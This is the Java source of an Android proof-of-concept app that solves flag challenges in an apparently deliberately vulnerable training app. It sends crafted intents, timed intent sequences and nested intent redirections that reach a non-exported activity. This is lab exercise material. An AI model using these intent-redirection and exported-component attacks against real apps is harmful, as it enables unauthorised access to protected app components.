package com.xylinz.poc;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    int counter = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView home = findViewById(R.id.string_flag);

        //Activity Intent Exploit from another app

        //Flag 1 - Activity only
        Intent flag1Intent = new Intent();
        flag1Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity");

        Button flag1 = findViewById(R.id.flag1_button);
        flag1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag1Intent);
            }
        });

        //Flag 2 - Activity with action
        Intent flag2Intent = new Intent();
        flag2Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity");
        flag2Intent.setAction("io.hextree.action.GIVE_FLAG");

        Button flag2 = findViewById(R.id.flag2_button);
        flag2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag2Intent);
            }
        });

        //Flag 3 - Activity with action and data URI
        Intent flag3Intent = new Intent();
        flag3Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity");
        flag3Intent.setAction("io.hextree.action.GIVE_FLAG");
        flag3Intent.setData(Uri.parse("https://app.hextree.io/map/android"));

        Button flag3 = findViewById(R.id.flag3_button);
        flag3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag3Intent);
            }
        });

        //Flag 4 - Activity with state machine (multiple call)
        Intent flag4Intent = new Intent();
        flag4Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity");

        String[] actions = new String[] { // action berbeda
                "PREPARE_ACTION",
                "BUILD_ACTION",
                "GET_FLAG_ACTION",
                null
        };

        Button flag4 = findViewById(R.id.flag4_button);
        flag4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Handler handler = new Handler(Looper.getMainLooper()); // ngehandle delay antar intent
                int delayMs = 0; // init delay
                for (String action : actions){
                    final Intent intent = new Intent(flag4Intent); // looping intent
                    if (action != null){
                        intent.setAction(action); // setiap intent punya action beda
                    }
                    else{
                        intent.setAction(null);
                    }
                    handler.postDelayed(new Runnable() { // ngehandle delay antar intent
                        @Override
                        public void run() {
                            startActivity(intent);
                        }
                    }, delayMs);
                    delayMs += 400; // tambah delay setiap iterasi
                }
            }
        });

        // Flag 5 - Intent in intent
        Button flag5 = findViewById(R.id.flag5_button);

        Intent innerIntent1 = new Intent();
        innerIntent1.putExtra("reason", "back");

        Intent innerIntent2 = new Intent();
        innerIntent2.putExtra("nextIntent", innerIntent1);
        innerIntent2.putExtra("return", 42);

        Intent flag5Intent = new Intent();
        flag5Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
        flag5Intent.putExtra("android.intent.extra.INTENT", innerIntent2);

        flag5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag5Intent);
            }
        });

        // Flag 6 - Not exported
        Button flag6 = findViewById(R.id.flag6_button);

        Intent finalFlag6Intent = new Intent();
        finalFlag6Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity");
        finalFlag6Intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        finalFlag6Intent.putExtra("reason", "next");

        Intent flag6Intent2 = new Intent();
        flag6Intent2.putExtra("nextIntent", finalFlag6Intent);
        flag6Intent2.putExtra("return", 42);

        Intent flag6Intent1 = new Intent();
        flag6Intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
        flag6Intent1.putExtra("android.intent.extra.INTENT", flag6Intent2);

        flag6.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag6Intent1);
            }
        });

        // Flag 7 - Activity lifecycle
        Button flag7 = findViewById(R.id.flag7_button);

        Intent flag7Intent = new Intent();
        flag7Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");
        flag7Intent.setAction("OPEN");

        Intent flag7Intent2 = new Intent();
        flag7Intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");
        flag7Intent2.setAction("REOPEN");
        flag7Intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); // harus ada, untuk trigger onNewIntent

        flag7.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag7Intent);
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        startActivity(flag7Intent2);
                    }
                }, 1000);
            }
        });

        // ActivityResult Flags - Flag 8 & 9
        Button ArButton = findViewById(R.id.ar_button);
        Intent activityResult = new Intent(MainActivity.this, ActivityResult.class);

        ArButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(activityResult);
            }
        });

        // ImplicitIntent Flags - Flag 10,11,12
        Button IiButton = findViewById(R.id.ii_button);
        Intent ImplicitIntent = new Intent(MainActivity.this, ImplicitIntent.class);

        IiButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(ImplicitIntent);
            }
        });

        // PendingIntentFlagHere Flags - Flag 22,23
        Button PiButton = findViewById(R.id.pi_button);
        Intent pendingIntent = new Intent(MainActivity.this, PendingIntentFlagHere.class);

        PiButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(pendingIntent);
            }
        });

    }
}